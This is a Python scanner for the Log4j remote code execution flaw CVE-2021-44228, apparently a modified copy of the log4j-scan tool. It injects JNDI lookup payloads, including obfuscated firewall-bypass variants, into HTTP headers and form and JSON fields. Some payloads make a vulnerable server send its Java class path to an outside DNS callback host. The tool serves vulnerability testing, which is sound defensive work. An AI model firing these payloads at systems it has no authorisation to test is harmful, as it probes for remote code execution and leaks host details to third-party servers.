#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
# Author:
# Mazin Ahmed <Mazin at FullHunt.io>
# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# Secure your Attack Surface with FullHunt.io.
# ******************************************************************

import argparse
import datetime
import hashlib
import random
from os import getpid

import requests
import time
import sys
from urllib import parse as urlparse
import base64
import json
import random
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from termcolor import cprint


# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

from os import getpid


PID = getpid()
PID = str(int(datetime.datetime.now().timestamp()))

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)


default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
post_data_parameters = {
    'PTusnm': "username",
    'PTusr': "user",
    'PTeml': "email",
    'PTemla': "email_address",
    'PTpswd': "password",
}
timeout = 4

waf_bypass_payloads = {
  "plz": '${jndi:ldap://x${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}}',
  "ply": '${jndi:dns://x${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}}',
  "plx": '${jndi:rmi://x${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}}',
  "plq": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}",
  "pla": "${${::-j}ndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}",
  "plb": "${jndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "plc": "${${lower:jndi}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}",
  "pld": "${${lower:${lower:jndi}}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}",
  "ple": "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}",
  "pld": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}/{{random}}}",
  "plf": "${jndi:dns://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl0": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl1": "${${::-j}ndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl2": "${jndi:rmi://{{verb}}.x${sys:java.class.path}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl3": "${${lower:jndi}:${lower:rmi}://{{verb}}.x${sys:java.class.path}{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl4": "${${lower:${lower:jndi}}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl5": "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl6": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl7": "${jndi:dns://x${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl8": "${jndi:dns://x${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl9": "${jndi:dns://x${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl10": "${jndi:dns://x${sys:java.class.path}..{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl11": "${jndi:dns://x${sys:java.class.path}.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
}

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--run-all-tests",
                    dest="run_all_tests",
                    help="Run all available tests on each URL.",
                    action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--wait-time",
                    dest="wait_time",
                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
                    default=5,
                    type=int,
                    action='store')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--dns-callback-provider",
                    dest="dns_callback_provider",
                    help="DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].",
                    default="interact.sh",
                    action='store')
parser.add_argument("--custom-dns-callback-host",
                    dest="custom_dns_callback_host",
                    help="Custom DNS Callback Host.",
                    action='store')

args = parser.parse_args()


proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}


def strip_template(value, keys):
    for key in keys:
        value = value.replace('{{' + key + '}}.', '')
    return value


def get_fuzzing_headers(payload):
    # payload = payload.replace('')
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    header_hashmap = {}
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            hash_id = hash_string(i, 6, prefix='hdr')
            fuzzing_headers.update({i: strip_template(payload.replace('{{header_id}}', hash_id), keys=['var', 'pvar'])})
            header_hashmap[hash_id] = i
    # with open('header_hashmap-%d.json' % getpid(), mode='w') as fd:
    #    json.dump(header_hashmap, fd)
    # if args.exclude_user_agent_fuzzing:
    #    fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
    # fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    print(json.dumps(fuzzing_headers, indent=2))
    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for k, v in post_data_parameters.items():
        fuzzing_post_data[v] = payload.replace('{{pvar}}', k).replace('{{verb}}.', '').replace('{{header_id}}.', '').replace('{{var}}.', '')

    return fuzzing_post_data


def generate_waf_bypass_payloads(callback_host, random_string):
    payloads = []
    for pd, pv in waf_bypass_payloads.items():
        # pd is the payload label/description
        new_payload = pv.replace("{{callback_host}}", pd + '.' + callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


class Dnslog(object):
    def __init__(self):
        self.s = requests.session()
        self.s.verify = False
        req = self.s.get("http://www.dnslog.cn/getdomain.php", timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self.s.get("http://www.dnslog.cn/getrecords.php", timeout=30)
        return req.json()


class Interactsh:
    # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
    def __init__(self, token="", server=""):
        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = server.lstrip('.') or 'interact.sh'
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid4())
        self.encoded = b64encode(self.public_key).decode("utf8")
        guid = uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlation_id = self.domain[:20]

        self.session = requests.session()
        self.session.headers = self.headers
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        res = self.session.post(
            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
        if 'success' not in res.text:
            raise Exception("Can not initiate interact.sh DNS callback client")

    def pull_logs(self):
        result = []
        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
        res = self.session.get(url, headers=self.headers, timeout=30).json()
        aes_key, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.__decrypt_data(aes_key, i)
            result.append(self.__parse_log(decrypt_data))
        return result

    def __decrypt_data(self, aes_key, data):
        private_key = RSA.importKey(self.private_key)
        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
        decode = base64.b64decode(data)
        bs = AES.block_size
        iv = decode[:bs]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def __parse_log(self, log_entry):
        new_log_entry = {"timestamp": log_entry["timestamp"],
                         "host": f'{log_entry["full-id"]}.{self.domain}',
                         "remote_address": log_entry["remote-address"]
                         }
        return new_log_entry


def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if '://' not in url:
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if file_path == '':
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})


def hash_string(value, n=8, prefix=None):
    """Hash a value, truncate it at n chars"""
    m = hashlib.sha256()
    value = value.encode('utf-8')
    m.update(value)
    value = m.hexdigest()[:n]
    return value if prefix is None else prefix + value


def strip_url(v):
    return v.replace('{{header_id}}.', '').replace('{{pvar}}.', '')


def strip_post_data(data):
    for k, v in data.items():
        data[k] = v.replace('{{header_id}}.', '')
    return data


def wrap_request(*args, **kwargs):
    try:
        if 'url' in kwargs:
            kwargs['url'] = kwargs['url'].replace('{{header_id}}.', '').replace('{{pvar}}.', '')
        if 'params' in kwargs:
            for k, v in kwargs['params'].items():
                kwargs['params'][k] = v.replace('{{header_id}}.', '').replace('{{pvar}}.', '')
        if 'data' in kwargs:
            for k, v in kwargs['data'].items():
                kwargs['data'][k] = v.replace('{{header_id}}.', '').replace('{{var}}.', '')
    except Exception as err:
        raise
    requests.request(*args, **kwargs)


def strip_header(value):
    return value.replace('{{var}}.', '').replace('{{pvar}}.', '')


def scan_url(url, callback_host):
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(3))
    # payload = '${jndi:ldap://%s.{{verb}}.%s/%s}' % (parsed_url["host"], callback_host, random_string)
#    payload = '${jndi:ldap://%s.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.%s/%s}' % (parsed_url["host"], callback_host, random_string)
    payload = '${jndi:ldap://x${sys:java.class.path}.%s.{{verb}}.{{var}}.{{pvar}}.{{header_id}}.%s/%s}' % (parsed_url["host"], callback_host, random_string)


    payloads = [payload]

    if args.waf_bypass_payloads:
        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
    for payload in payloads:
        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
        if args.request_type.upper() == "GET" or args.run_all_tests:
            try:
                tagged_payload = payload.replace('{{verb}}', 'vGT')
                wrap_request(
                    url=url,
                    method="GET",
                    params={},
                    # params={"v": tagged_payload},
                    headers=get_fuzzing_headers(tagged_payload),
                    verify=False,
                    timeout=timeout,
                    proxies=proxies)
                # requests.request(url=url,
                #                  method="GET",
                #                  params={"v": tagged_payload},
                #                  headers=get_fuzzing_headers(tagged_payload),
                #                  verify=False,
                #                  timeout=timeout,
                #                  proxies=proxies)
            except Exception as e:
                print('yo')
                cprint(f"EXCEPTION: {e}")

        if args.request_type.upper() == "POST" or args.run_all_tests:
            try:
                # Post body
                tagged_payload = payload.replace('{{verb}}', 'vPT')
                wrap_request(
                    url=url,
                    method="POST",
                    # params={"v": tagged_payload},
                    params={},
                    headers=get_fuzzing_headers(tagged_payload),
                    data=get_fuzzing_post_data(tagged_payload),
                    verify=False,
                    timeout=timeout,
                    proxies=proxies)
                # requests.request(url=url,
                #                  method="POST",
                #                  params={"v": tagged_payload},
                #                  headers=get_fuzzing_headers(tagged_payload),
                #                  data=get_fuzzing_post_data(tagged_payload),
                #                  verify=False,
                #                  timeout=timeout,
                #                  proxies=proxies)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")

            try:
                # JSON body
                tagged_payload = payload.replace('{{verb}}', 'vPJ')
                wrap_request(
                    url=url,
                    method="POST",
                    # params={"v": tagged_payload},
                    params={},
                    headers=get_fuzzing_headers(tagged_payload),
                    json=get_fuzzing_post_data(tagged_payload),
                    verify=False,
                    timeout=timeout,
                    proxies=proxies)
                # requests.request(url=url,
                #                  method="POST",
                #                  params={"v": tagged_payload},
                #                  headers=get_fuzzing_headers(tagged_payload),
                #                  json=get_fuzzing_post_data(tagged_payload),
                #                  verify=False,
                #                  timeout=timeout,
                #                  proxies=proxies)
            except Exception as e:
                cprint(f"EXCEPTION: {e}")


def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    dns_callback_host = ""
    if args.custom_dns_callback_host:
        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
        dns_callback_host = f'p{PID}.{args.custom_dns_callback_host}'
    else:
        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
        if args.dns_callback_provider == "interact.sh":
            dns_callback = Interactsh()
        elif args.dns_callback_provider == "dnslog.cn":
            dns_callback = Dnslog()
        else:
            raise ValueError("Invalid DNS Callback provider")
        dns_callback_host = dns_callback.domain

    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
    for url in urls:
        cprint(f"[•] URL: {url}", "magenta")
        scan_url(url, dns_callback_host)

    if args.custom_dns_callback_host:
        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
        return

    cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
    cprint("[•] Waiting...", "cyan")
    time.sleep(args.wait_time)
    records = dns_callback.pull_logs()
    if len(records) == 0:
        cprint("[•] Targets does not seem to be vulnerable.", "green")
    else:
        cprint("[!!!] Target Affected", "yellow")
        for i in records:
            cprint(i, "yellow")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
